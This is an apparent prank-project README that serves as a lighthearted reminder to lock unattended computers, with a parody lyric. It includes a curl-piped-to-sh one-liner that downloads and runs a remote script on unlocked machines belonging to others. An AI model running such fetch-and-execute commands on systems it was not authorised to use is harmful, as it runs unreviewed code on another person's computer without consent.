# This is PSA

```
It's a moment when I show up, got 'em sayin', "Wow" (Wow, wow)
```

Don't worry, I haven't done anything _too_ bad.

It's very simple to lock your computer before getting up and going somewhere else without it. Unfortunately, not many people do this. What a shame.

On Macs, it's as simple as `cmd + ctrl + q`.

On Windows, it's as simple as `win + L`.

This is my declaration (to the tune of Sunflower by Post Malone):

```
Needless to say, I keep it in git
Security boo boo, nevertheless (yeah)
Callin' a shell script, baby, you'll be hacked (hacked)
Check your background, baby, you've been hacked (hacked)
```

I will run this if you leave your computer unlocked and walk away:

```
sh -c "$(curl -fsSL https://raw.githubusercontent.com/chrisarevir/malone-protocol/master/protocol.sh)"
```

While we may be getting more secure to cyber-based espionage, there's nothing that beats a little social engineering. Letting the wrong person get physical access to your computer can be harmful, even if not immediately apparent.
